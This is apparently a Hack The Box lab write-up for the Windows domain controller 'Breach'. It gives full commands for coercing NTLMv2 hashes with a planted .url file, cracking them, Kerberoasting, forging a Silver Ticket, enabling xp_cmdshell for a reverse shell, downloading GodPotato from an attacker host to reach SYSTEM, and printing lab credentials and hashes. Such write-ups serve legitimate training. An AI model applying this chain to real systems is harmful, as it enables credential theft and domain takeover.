# HTB Write-Up: Breach

| Field      | Details                                                                  |
|------------|--------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Breach)               |
| Difficulty | Medium                                                                   |
| OS         | Windows                                                                  |
| Author     | Landau                                                                  |
| Date       | July 6, 2026                                                              |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Guest Access](#2-enumeration--smb-guest-access)
3. [Initial Access — NTLMv2 Capture via Internet Shortcut File](#3-initial-access--ntlmv2-capture-via-internet-shortcut-file)
4. [Lateral Movement — Kerberoasting `svc_mssql`](#4-lateral-movement--kerberoasting-svc_mssql)
5. [Privilege Escalation — Silver Ticket & xp_cmdshell](#5-privilege-escalation--silver-ticket--xp_cmdshell)
6. [Privilege Escalation — SeImpersonatePrivilege (GodPotato)](#6-privilege-escalation--seimpersonateprivilege-godpotato)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

Nmap was used for full service and version fingerprinting:

```bash
nmap -A 10.129.25.237
```

**Open Ports:**

| Port   | Service       | Details                                              |
|--------|---------------|-------------------------------------------------------|
| 53     | DNS           | Simple DNS Plus                                       |
| 80     | HTTP          | Microsoft IIS 10.0                                    |
| 88     | Kerberos      | Microsoft Windows Kerberos                            |
| 135    | MSRPC         | Microsoft Windows RPC                                 |
| 139    | NetBIOS       | Microsoft Windows netbios-ssn                         |
| 389    | LDAP          | Domain: `breach.vl`                                   |
| 445    | SMB           | microsoft-ds                                          |
| 464    | kpasswd5      | tcpwrapped                                             |
| 593    | HTTP-RPC      | RPC over HTTP                                          |
| 636    | LDAPSSL       | tcpwrapped                                             |
| 1433   | MSSQL         | Microsoft SQL Server 2019 15.00.2000.00 (`BREACHDC\SQLEXPRESS`) |
| 3268   | LDAP (GC)     | Global Catalog                                        |
| 3269   | LDAPSSL (GC)  | tcpwrapped                                             |
| 3389   | RDP           | Microsoft Terminal Services                            |
| 5985   | WinRM/HTTPAPI | Microsoft-HTTPAPI/2.0                                  |

The host is a **Domain Controller** (`BREACHDC`) for domain **`breach.vl`**, running **Windows Server 2022**. The presence of **MSSQL (1433)** alongside a DC is the standout finding — it hints at a SQL Server-based escalation path later in the chain.

---

## 2. Enumeration — SMB Guest Access

Guest/null SMB authentication was tested and succeeded:

```bash
netexec smb 10.129.25.237 -u guest -p '' --shares
```

**Output:**

```
SMB   10.129.25.237  445  BREACHDC  [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.129.25.237  445  BREACHDC  [+] breach.vl\guest:
SMB   10.129.25.237  445  BREACHDC  Share      Permissions   Remark
SMB   10.129.25.237  445  BREACHDC  -----      -----------   ------
SMB   10.129.25.237  445  BREACHDC  ADMIN$                   Remote Admin
SMB   10.129.25.237  445  BREACHDC  C$                       Default share
SMB   10.129.25.237  445  BREACHDC  IPC$       READ          Remote IPC
SMB   10.129.25.237  445  BREACHDC  NETLOGON                 Logon server share
SMB   10.129.25.237  445  BREACHDC  share      READ,WRITE
SMB   10.129.25.237  445  BREACHDC  SYSVOL                   Logon server share
SMB   10.129.25.237  445  BREACHDC  Users      READ
```

The `share` disk stood out immediately: **guest READ,WRITE**. Browsing it with `smbclient` revealed three subfolders — `finance`, `software`, and `transfer` — with `transfer` containing per-user directories (`claire.pope`, `diana.pope`, `julia.wong`) that guest could not list, but could still write into at the share root/subfolder level.

---

## 3. Initial Access — NTLMv2 Capture via Internet Shortcut File

Since guest had **write** access to the share, the classic **coercion-via-icon-fetch** technique was used: dropping a file that forces Windows Explorer to resolve an icon over SMB whenever a real user browses the folder, leaking that user's NTLMv2 hash to an attacker-controlled listener.

An initial attempt was made with an `@Inventory.scf` file, which produced no hits — likely due to inconsistent Explorer/version handling of `.scf` icon resolution. The technique was retried with an **Internet Shortcut (`.url`) file** instead, which triggered reliably:

```ini
[InternetShortcut]
URL=whatever
IconFile=\\10.10.15.28\share\legit.ico
IconIndex=1
```

The file was uploaded into the `transfer` folder:

```bash
smbclient //10.129.25.237/share -N
smb: \> cd transfer\
smb: \transfer\> put @Invertory.url
```

`Responder` was left listening on the VPN interface:

```bash
sudo responder -I tun0 -wv
```

**Captured hash:**

```
[SMB] NTLMv2-SSP Client   : 10.129.25.237
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:1d9aa994ccce5415:95F3967E281F7CA9C06A78B41946E5DF:...
```

The hash was cracked offline with **John the Ripper**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=netntlmv2
```

**Result:**

```
Computer1        (Julia.Wong)
```

Credentials obtained: `breach.vl\Julia.Wong : Computer1`

---

## 4. Lateral Movement — Kerberoasting `svc_mssql`

With a valid low-privileged domain account, SPNs were enumerated for Kerberoastable service accounts:

```bash
impacket-GetUserSPNs breach.vl/Julia.Wong:'Computer1' -dc-ip 10.129.25.237 -request
```

**Result:**

```
ServicePrincipalName              Name        PasswordLastSet
--------------------------------  ----------  --------------------------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql   2022-02-17 14:43:08.106169
```

The TGS-REP hash for `svc_mssql` was captured and cracked:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sql_hash --format=krb5tgs
```

**Result:**

```
Trustno1         (svc_mssql)
```

Credentials obtained: `breach.vl\svc_mssql : Trustno1`

An authenticated MSSQL session was then opened as the low-privileged service account:

```bash
impacket-mssqlclient svc_mssql@10.129.25.237 -windows-auth
```

This landed in the context `BREACH\svc_mssql guest@master` — guest-level DB access only, insufficient for `xp_cmdshell` or the linked server (`BREACHDC\SQLEXPRESS`) without further escalation.

---

## 5. Privilege Escalation — Silver Ticket & xp_cmdshell

`svc_mssql` runs the MSSQL service, meaning the account's NTLM hash can be used to **forge a Silver Ticket** for the `MSSQLSvc` SPN — impersonating `Administrator` against the SQL service without ever needing the domain admin's real credentials.

The NTLM hash for `svc_mssql` was derived from the cracked plaintext:

```bash
pypykatz crypto nt Trustno1
# 69596c7aa1e8daee17f8e78870e25a5c
```

A Silver Ticket was forged with `impacket-ticketer`:

```bash
impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -nthash 69596c7aa1e8daee17f8e78870e25a5c \
  -dc-ip 10.129.25.237 \
  -domain breach.vl \
  -user-id 500 \
  administrator
```

The ticket was loaded and used to authenticate to MSSQL via Kerberos as `Administrator`:

```bash
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -windows-auth -k -no-pass breachdc.breach.vl
```

This returned a session as `BREACH\Administrator dbo@master` — full `sysadmin` context on the SQL Server.

**Enabling `xp_cmdshell`:**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- breach\svc_mssql
```

Command execution was confirmed as `svc_mssql`. A reverse shell was triggered via a Base64-encoded PowerShell TCP client payload passed through `xp_cmdshell`, catching the callback with `netcat`:

```bash
rlwrap nc -nvlp 9001
```

```
connect to [10.10.15.28] from (UNKNOWN) [10.129.25.237] 59238
```

**User flag / RCE confirmed as `breach\svc_mssql`.**

---

## 6. Privilege Escalation — SeImpersonatePrivilege (GodPotato)

Checking privileges on the shell as `svc_mssql`:

```powershell
whoami /priv
```

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`SeImpersonatePrivilege` being enabled opens the door to token impersonation exploits. **PrintSpoofer** was attempted first and failed to trigger:

```powershell
curl 10.10.15.28/PrintSpoofer64.exe -o PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c 'whoami'
# [-] Operation failed or timed out.
```

**GodPotato** was used instead and succeeded:

```powershell
curl 10.10.15.28/GodPotato-NET4.exe -o GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

**Output:**

```
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
nt authority\system
```

Root flag retrieved:

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c type c:\Users\Administrator\Desktop\root.txt"
```

```
fc98f418f94f8cdb9a30ef026fe64345
```

**Root flag retrieved from `\Administrator\Desktop\root.txt` as `NT AUTHORITY\SYSTEM`.**

---

## 7. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap | DC identified, `breach.vl`, Windows Server 2022; MSSQL on a DC noted as anomalous |
| Enumeration | `netexec` guest SMB enum | Writable `share` disk found via guest/null auth |
| Initial Access | Internet Shortcut (`.url`) icon-fetch coercion + Responder | NTLMv2 hash for `Julia.Wong` captured; cracked to `Computer1` |
| Lateral (1) | `GetUserSPNs` — Kerberoasting | TGS-REP hash for `svc_mssql` cracked to `Trustno1` |
| Lateral (2) | `impacket-mssqlclient` as `svc_mssql` | Guest-level DB access confirmed, insufficient for `xp_cmdshell` |
| Privesc (1) | Silver Ticket (`impacket-ticketer`) using `svc_mssql`'s NT hash | Forged Kerberos ticket impersonating `Administrator` for the MSSQL SPN |
| Privesc (2) | `xp_cmdshell` via sysadmin MSSQL session | RCE as `breach\svc_mssql` |
| Privesc (3) | `SeImpersonatePrivilege` abuse — GodPotato (PrintSpoofer failed) | SYSTEM shell |
| Root | GodPotato `cmd /c type root.txt` | `root.txt` from `\Administrator\Desktop` |

### Key Takeaways

- **Writable guest SMB shares are a direct path to credential capture.** Any share allowing anonymous write access can be weaponized with icon-fetch coercion files (`.scf`/`.url`) to force authenticated users into leaking NTLMv2 hashes the moment they browse the folder.

- **`.url` files are a more reliable coercion vector than `.scf`.** Modern Windows/Explorer versions handle Internet Shortcut icon resolution more consistently than the older Shell Command File format, making `.url` the better first choice in practice.

- **Kerberoasting remains effective against service accounts with weak passwords.** `svc_mssql`'s SPN registration made it targetable the moment any valid domain credential was obtained — the account's weak password (`Trustno1`) fell instantly to rockyou.txt.

- **A cracked service account hash can escalate far beyond its own privileges via a Silver Ticket.** Because Kerberos service tickets are validated locally by the service (not the KDC), possessing a service account's NTLM hash is enough to forge tickets impersonating **any** user — including `Administrator` — scoped to that specific service.

- **MSSQL's `xp_cmdshell` is a reliable RCE primitive once sysadmin context is achieved.** Enabling it via `sp_configure` from a Silver-Ticket-authenticated session turned database access into full command execution.

- **`SeImpersonatePrivilege` is still a critical misconfiguration.** Service accounts routinely retain this privilege, and while individual exploits (PrintSpoofer) may fail depending on patch level, alternative Potato-family tools (GodPotato) frequently still succeed, escalating any impersonation-capable process straight to `NT AUTHORITY\SYSTEM`.
